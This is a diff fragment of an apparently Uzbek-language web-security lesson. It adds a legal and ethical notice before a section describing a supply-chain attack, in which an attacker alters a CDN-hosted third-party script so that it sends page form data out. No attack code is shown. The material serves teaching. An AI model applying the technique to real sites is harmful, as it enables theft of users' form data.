@@ -224,6 +224,8 @@ console.log("CDN buzilgandan keyin:", loadWeak("https://cdn.vendor.example/xarit
 
 ### 2. Hujum
 
+> **Ta'lim maqsadida.** Bu uchinchi tomon skriptini o'zgartirish usuli faqat shu darsning o'quv kodida ko'rsatiladi; uni o'z tizimingizda yoki yozma ruxsat va kelishilgan doira bilan sinang. Ruxsatsiz qo'llash Jinoyat kodeksining 278-4-moddasi (Kompyuter axborotini modifikatsiyalashtirish) va 278-6-moddasi (Zarar keltiruvchi dasturlar) doirasiga tushishi mumkin (kurs talqini). Batafsil: 9-dars.
+
 Hujumchi CDN'ga yoki vendor akkauntiga kirib, `xarita.js` oxiriga forma ma'lumotlarini yuboruvchi qator qo'shdi. Sizning sahifangizda hech narsa o'zgarmagan, lekin brauzer yangi mazmunni bajaradi:
 
 ```text
